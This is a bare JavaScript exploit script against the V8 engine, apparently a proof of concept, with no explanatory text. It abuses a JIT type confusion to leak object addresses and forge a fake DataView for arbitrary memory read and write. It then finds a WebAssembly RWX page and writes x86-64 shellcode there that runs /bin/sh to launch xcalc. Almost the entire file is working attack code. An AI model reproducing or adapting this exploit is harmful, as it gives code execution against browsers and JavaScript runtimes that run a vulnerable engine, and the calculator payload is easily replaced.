manager_ab = new ArrayBuffer(8);
target_ab = new ArrayBuffer(8);

wasm_bytes = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 8, 2, 96, 1, 127, 0, 96, 0, 0, 2, 25, 1, 7, 105, 109, 112, 111, 114, 116, 115, 13, 105, 109, 112, 111, 114, 116, 101, 100, 95, 102, 117, 110, 99, 0, 0, 3, 2, 1, 1, 7, 17, 1, 13, 101, 120, 112, 111, 114, 116, 101, 100, 95, 102, 117, 110, 99, 0, 1, 10, 8, 1, 6, 0, 65, 42, 16, 0, 11]);
wasm_inst = new WebAssembly.Instance(new WebAssembly.Module(wasm_bytes), {imports: {imported_func: function(x){ return x; }}});
wasm_func = wasm_inst.exports.exported_func;

function d_to_i2(c){
    var x=new Uint32Array(new Float64Array([c]).buffer);
    return[x[1],x[0]];
}
 
function i2_to_d(a){
    return new Float64Array(new Uint32Array([a[1],a[0]]).buffer)[0];
}
 
function i2_to_hex(a){
    var c=("00000000"+a[0].toString(16)).substr(-8);
    var b=("00000000"+a[1].toString(16)).substr(-8);
    return[c,b];}
 
function p_i2(a){
    console.log(i2_to_hex(d_to_i2(a))[0]+i2_to_hex(d_to_i2(a))[1]);
    }
 

function hex(a){
    return"0x"+("00000000"+a[0].toString(16)).slice(-8)+("00000000"+a[1].toString(16)).slice(-8)};

function gc() {
    for (let i = 0; i < 0x10; i++)
        new ArrayBuffer(0x1000000);}
    
var b = [1.1,2.2,3.3];
function read_fake_map(object){
    function opt(b,cb) {
        var x = b[1] ;
        cb();
        return b[0];
      }
    function fuck(){
        ret = opt(b,()=>{b[0]=object});
        return ret 
    }
    for(var i =0;i<0x20000;i++){
        opt(b,()=>{return i+1.1});} 
    fake_map_obj_addr = fuck()
    return fake_map_obj_addr
}

//here, we need to fake a DataView 
//first we fake the map of dataview
var fake_map_obj = [
    /* Fake Map object */
    i2_to_d([0,0]),
    i2_to_d([0x1900043b,0x16080808]),
    i2_to_d([0,0x82003ff]),
    i2_to_d([0,0]),
    /* Fake ArrayBuffer object (fake_map_obj+0x20)*/ 
    i2_to_d([0,0]),
    i2_to_d([0,0]),
    i2_to_d([0,0]),
    i2_to_d([0,0]),
    i2_to_d([0x44444444,0x43434343]),// backing store, pointed to heap 
    i2_to_d([0,0]),
].slice(0);

//push the fake_map_obj to old space and become fixed
gc();
gc();
gc();

// got it from leakage 
//Leak - offset == fake map location
offset = 0x60-0x10
fake_map_obj_addr = read_fake_map(fake_map_obj);
console.log("[+] Leaked fake map :");
p_i2(fake_map_obj_addr);
//fake table is on -0x51 
fake_map_obj_addr = d_to_i2(fake_map_obj_addr);
console.log(fake_map_obj_addr);
//%DebugPrint(fake_map_obj);

var fake_map_lo =  fake_map_obj_addr[1] -offset-1;
var fake_map_hi =  fake_map_obj_addr[0] ;

console.log("Fake map location :");
p_i2(i2_to_d([fake_map_hi,fake_map_lo]));

var c = [1.11,2.22,3.33,4.44];
function read_fake_dv(object){
    function opt(c,cb) {
        var x = c[1] ;
        cb();
        return c[0];
      }
    function fuck(){
        ret = opt(c,()=>{c[0]=object});
        return ret 
    }
    //need use var here, let will fail
    for(var i =0;i<0x20000;i++){
        opt(c,()=>{});}
    fake_map_obj_addr = fuck();
    return fake_map_obj_addr
}


var fake_dv_obj = [
    i2_to_d([fake_map_hi,fake_map_lo + 1]),
    i2_to_d([0,0]),
    i2_to_d([0,0]),
    i2_to_d([fake_map_hi,fake_map_lo + 0x20 + 1]), //arraybuffer 
    i2_to_d([0,0]),
    i2_to_d([0x4000,0]),
    ].slice(0);


//this gc is to prevent this crash
//Fatal error in ../../src/heap/mark-compact.cc, line 1119
//Debug check failed: p->InToSpace() implies p->IsFlagSet(Page::PAGE_NEW_NEW_PROMOTION).
//Also we need the fake map object ,so we must push it to old space
gc();
gc();
gc();
gc();
gc();


fake_dv_obj_addr = read_fake_dv(fake_dv_obj);
console.log("[+] Leaked fake_dv_obj :");
p_i2(fake_dv_obj_addr);

//%DebugPrint(fake_dv_obj);
//Leaked - 0x30

fake_dv_buffer = d_to_i2(fake_dv_obj_addr);
var fake_dv_buffer_lo =  fake_dv_buffer[1] -0x30;
var fake_dv_buffer_hi =  fake_dv_buffer[0] ;

fake_dv_buffer_addr = i2_to_d([fake_dv_buffer_hi,fake_dv_buffer_lo]);
console.log("Faked DataView Address");
p_i2(fake_dv_buffer_addr)
var z = [1.11111,2.22222,3.33333,4.44444];
function read_manager_ab(object){
    function opt(z,cb) {
        var x = z[1] ;
        cb();
        return z[0];
      }
    function fuck(){
        ret = opt(z,()=>{z[0]=object});
        return ret 
    }
    //need use var here, let will fail
    for(var i =0;i<0x20000;i++){
        opt(z,()=>{});}
    fake_map_obj_addr = fuck();
    return fake_map_obj_addr
}
manager_ab_addr = read_manager_ab(manager_ab);
console.log("[+] Leaked manager_ab :");
p_i2(manager_ab_addr);
var manager_ab_addr = d_to_i2(manager_ab_addr)
var manager_ab_addr_lo =  manager_ab_addr[1] -1;
var manager_ab_addr_hi =  manager_ab_addr[0] ;

var y = [1.11111,2.22222,3.33333,4.44444];
function read_target_ab(object){
    function opt(y,cb) {
        var x = y[1] ;
        cb();
        return y[0];
      }
    function fuck(){
        ret = opt(y,()=>{y[0]=object});
        return ret 
    }
    //need use var here, let will fail
    for(var i =0;i<0x20000;i++){
        opt(y,()=>{});}
    fake_map_obj_addr = fuck();
    return fake_map_obj_addr
}
target_ab_addr = read_target_ab(target_ab);
console.log("[+] Leaked target_ab :");
p_i2(target_ab_addr);
var target_ab_addr = d_to_i2(target_ab_addr)
var target_ab_addr_lo =  target_ab_addr[1] -1;
var target_ab_addr_hi =  target_ab_addr[0] ;


var fuck_wasm = [1.11111,2.22222,3.33333,4.44444];
function leak_wasm(object){
    function opt(fuck_wasm,cb) {
        var x = fuck_wasm[1] ;
        cb();
        return fuck_wasm[0];
      }
    function fuck(){
        ret = opt(fuck_wasm,()=>{fuck_wasm[0]=object});
        return ret 
    }
    //need use var here, let will fail
    for(var i =0;i<0x20000;i++){
        opt(fuck_wasm,()=>{});}
    fake_map_obj_addr = fuck();
    return fake_map_obj_addr
}
wasm_object_addr = leak_wasm(wasm_func);
console.log("[+] Leaked wasm_object_addr :");
p_i2(wasm_object_addr);
var wasm_object_addr = d_to_i2(wasm_object_addr)
var wasm_object_addr_lo =  wasm_object_addr[1] -1;
var wasm_object_addr_hi =  wasm_object_addr[0] ;



//Get back the object 
var fake_dv = [1.111,2.222,3.333,4.444];
function return_object(addr){
    function opt(fake_dv,cb,addr_v) {
        var x = fake_dv[1] ;
        cb();
        fake_dv[0] = addr_v;
      }
    for(var i =0;i<100000;i++){
        opt(fake_dv,()=>{},1.1);}
    opt(fake_dv,()=>{fake_dv[0]={}},addr);
}

//Doing GC here will crash the DataView faking process
//Filling of the DataView map with fake data will also crash

//fake_map_obj[8] =i2_to_d([manager_ab_addr_hi,manager_ab_addr_lo + 0x20]);
fake_map_obj[8] =i2_to_d([wasm_object_addr_hi,wasm_object_addr_lo +8]);
return_object(fake_dv_buffer_addr);

dv = fake_dv[0];
console.log("addr contains rwx :")
p_i2(i2_to_d([wasm_object_addr_hi,wasm_object_addr_lo-208+8]))
function read_ptr(addr){
    fake_map_obj[8] =i2_to_d(addr);
    var lo = DataView.prototype.getUint32.call(dv, 0, true);
    var hi = DataView.prototype.getUint32.call(dv, 4, true);
    return (i2_to_d([hi,lo]));
}

//in debug build, the offset is -208
//release build is -200
wasm_rwx = read_ptr([wasm_object_addr_hi,wasm_object_addr_lo-208+8])
console.log("Leaked rwx :")
p_i2(wasm_rwx)


var shellcode = [0x6a,0x3b,0x58,0x99,0x48,0xbb,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x53,0x48,0x89,0xe7,0x68,0x2d,0x63,0x00,0x00,0x48,0x89,0xe6,0x52,0xe8,0x1c,0x00,0x00,0x00,0x44,0x49,0x53,0x50,0x4c,0x41,0x59,0x3d,0x3a,0x30,0x2e,0x30,0x20,0x2f,0x75,0x73,0x72,0x2f,0x62,0x69,0x6e,0x2f,0x78,0x63,0x61,0x6c,0x63,0x00,0x56,0x57,0x48,0x89,0xe6,0x0f,0x05]

fake_map_obj[8] = wasm_rwx
for (var k = 0; k < shellcode.length; ++k) {
    DataView.prototype.setUint32.call(dv, k * 1, shellcode[k], true);
}

wasm_func()
